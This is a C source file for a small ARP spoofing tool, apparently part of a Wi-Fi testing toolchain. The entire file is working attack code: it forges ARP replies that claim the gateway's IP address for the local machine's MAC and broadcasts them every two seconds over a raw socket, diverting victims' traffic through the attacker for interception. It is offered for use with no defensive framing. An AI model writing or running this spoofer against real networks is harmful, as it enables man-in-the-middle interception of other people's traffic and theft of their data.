/*
 * arpspoof - minimal ARP spoofing helper for the WiFiTester toolchain.
 *
 * The helper repeatedly answers ARP requests for the gateway address with
 * forged replies that map the gateway IPv4 address to the local MAC address.
 * A victim that accepts the reply sends its traffic to this host instead of
 * to the real gateway.
 *
 * The program is intentionally small and dependency free: it only needs a
 * raw AF_PACKET socket, which is available once the caller has root.
 *
 *   arpspoof -i <iface> [-t <victim-ip>] [-s <source-ip>] <gateway-ip>
 *
 * Author: part of the WiFiTester bundled toolchain (GPL-2.0-or-later).
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <net/if_packet.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define ETH_HEADER_LEN 14
#define ARP_FRAME_LEN 28
#define ETHERNET_FRAME_LEN (ETH_HEADER_LEN + ARP_FRAME_LEN)
#define INTERVAL_SECONDS 2

#define ETHER_TYPE_ARP 0x0806
#define ETHER_TYPE_IP 0x0800

/**
 * The ARP payload.
 *
 * <p>The kernel headers only describe the fixed part of the header, so the
 * address fields are declared here. Keeping the layout local avoids depending
 * on the bionic or kernel variant of {@code struct arphdr}.</p>
 */
struct arp_payload {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_length;
    uint8_t protocol_length;
    uint16_t operation;
    uint8_t sender_hardware[6];
    uint8_t sender_protocol[4];
    uint8_t target_hardware[6];
    uint8_t target_protocol[4];
} __attribute__((packed));

struct eth_header {
    uint8_t destination[6];
    uint8_t source[6];
    uint16_t protocol;
} __attribute__((packed));

static volatile sig_atomic_t running = 1;

static void handle_signal(int signal_number) {
    (void)signal_number;
    running = 0;
}

static void usage(const char *program) {
    fprintf(stderr,
            "usage: %s -i <iface> [-t <victim-ip>] [-s <source-ip>] <gateway-ip>\n",
            program);
}

/* Reads the hardware address of the given interface. */
static int read_mac(const char *interface_name, uint8_t *mac) {
    int control = socket(AF_INET, SOCK_DGRAM, 0);
    if (control < 0) {
        return -1;
    }
    struct ifreq request;
    memset(&request, 0, sizeof(request));
    strncpy(request.ifr_name, interface_name, IFNAMSIZ - 1);
    if (ioctl(control, SIOCGIFHWADDR, &request) < 0) {
        close(control);
        return -1;
    }
    close(control);
    memcpy(mac, request.ifr_hwaddr.sa_data, 6);
    return 0;
}

/* Reads the first IPv4 address configured for the given interface. */
static int read_ipv4(const char *interface_name, struct in_addr *address) {
    int control = socket(AF_INET, SOCK_DGRAM, 0);
    if (control < 0) {
        return -1;
    }
    struct ifreq request;
    memset(&request, 0, sizeof(request));
    strncpy(request.ifr_name, interface_name, IFNAMSIZ - 1);
    if (ioctl(control, SIOCGIFADDR, &request) < 0) {
        close(control);
        return -1;
    }
    close(control);
    memcpy(address, &request.ifr_addr, sizeof(struct in_addr));
    return 0;
}

int main(int argc, char **argv) {
    const char *interface_name = NULL;
    const char *victim_text = NULL;
    const char *source_text = NULL;
    const char *gateway_text = NULL;

    int option;
    while ((option = getopt(argc, argv, "i:t:s:h")) != -1) {
        switch (option) {
            case 'i':
                interface_name = optarg;
                break;
            case 't':
                victim_text = optarg;
                break;
            case 's':
                source_text = optarg;
                break;
            case 'h':
                usage(argv[0]);
                return 0;
            default:
                usage(argv[0]);
                return 2;
        }
    }
    if (optind < argc) {
        gateway_text = argv[optind];
    }
    if (interface_name == NULL || gateway_text == NULL) {
        usage(argv[0]);
        return 2;
    }

    struct in_addr gateway;
    if (inet_pton(AF_INET, gateway_text, &gateway) != 1) {
        fprintf(stderr, "arpspoof: invalid gateway address: %s\n", gateway_text);
        return 2;
    }
    struct in_addr victim;
    memset(&victim, 0, sizeof(victim));
    if (victim_text != NULL && inet_pton(AF_INET, victim_text, &victim) != 1) {
        fprintf(stderr, "arpspoof: invalid victim address: %s\n", victim_text);
        return 2;
    }

    uint8_t local_mac[6];
    if (read_mac(interface_name, local_mac) < 0) {
        fprintf(stderr, "arpspoof: cannot read the address of %s: %s\n",
                interface_name, strerror(errno));
        return 1;
    }

    struct in_addr local_address;
    memset(&local_address, 0, sizeof(local_address));
    if (source_text != NULL) {
        if (inet_pton(AF_INET, source_text, &local_address) != 1) {
            fprintf(stderr, "arpspoof: invalid source address: %s\n", source_text);
            return 2;
        }
    } else if (read_ipv4(interface_name, &local_address) < 0) {
        fprintf(stderr, "arpspoof: cannot read the address of %s, use -s <source-ip>\n",
                interface_name);
        return 1;
    }

    unsigned int interface_index = if_nametoindex(interface_name);
    if (interface_index == 0) {
        fprintf(stderr, "arpspoof: unknown interface: %s\n", interface_name);
        return 1;
    }

    int raw = socket(AF_PACKET, SOCK_RAW, htons(ETHER_TYPE_ARP));
    if (raw < 0) {
        fprintf(stderr, "arpspoof: cannot open a raw socket: %s\n", strerror(errno));
        fprintf(stderr, "arpspoof: root privileges are required\n");
        return 1;
    }

    struct sockaddr_ll destination;
    memset(&destination, 0, sizeof(destination));
    destination.sll_family = AF_PACKET;
    destination.sll_protocol = htons(ETHER_TYPE_ARP);
    destination.sll_ifindex = (int)interface_index;
    destination.sll_halen = 6;

    uint8_t frame[ETHERNET_FRAME_LEN];
    memset(frame, 0, sizeof(frame));

    struct eth_header *ethernet = (struct eth_header *)frame;
    struct arp_payload *arp = (struct arp_payload *)(frame + ETH_HEADER_LEN);

    /* Default destination is the broadcast address. */
    memset(ethernet->destination, 0xff, 6);
    memcpy(ethernet->source, local_mac, 6);
    ethernet->protocol = htons(ETHER_TYPE_ARP);

    arp->hardware_type = htons(ARPHRD_ETHER);
    arp->protocol_type = htons(ETHER_TYPE_IP);
    arp->hardware_length = 6;
    arp->protocol_length = 4;
    arp->operation = htons(ARPOP_REPLY);
    memcpy(arp->sender_hardware, local_mac, 6);
    memcpy(arp->sender_protocol, &gateway, 4);
    memset(arp->target_hardware, 0, 6);
    memcpy(arp->target_protocol, &victim, 4);

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    char local_text[INET_ADDRSTRLEN];
    char gateway_label[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &local_address, local_text, sizeof(local_text));
    inet_ntop(AF_INET, &gateway, gateway_label, sizeof(gateway_label));

    printf("arpspoof: %s -> %s is at %02x:%02x:%02x:%02x:%02x:%02x\n",
           local_text, gateway_label,
           local_mac[0], local_mac[1], local_mac[2],
           local_mac[3], local_mac[4], local_mac[5]);
    fflush(stdout);

    while (running) {
        ssize_t written = sendto(raw, frame, sizeof(frame), 0,
                                  (struct sockaddr *)&destination,
                                  sizeof(destination));
        if (written < 0) {
            if (errno == EINTR) {
                continue;
            }
            fprintf(stderr, "arpspoof: send failed: %s\n", strerror(errno));
            break;
        }
        sleep(INTERVAL_SECONDS);
    }

    close(raw);
    printf("arpspoof: stopped\n");
    return 0;
}
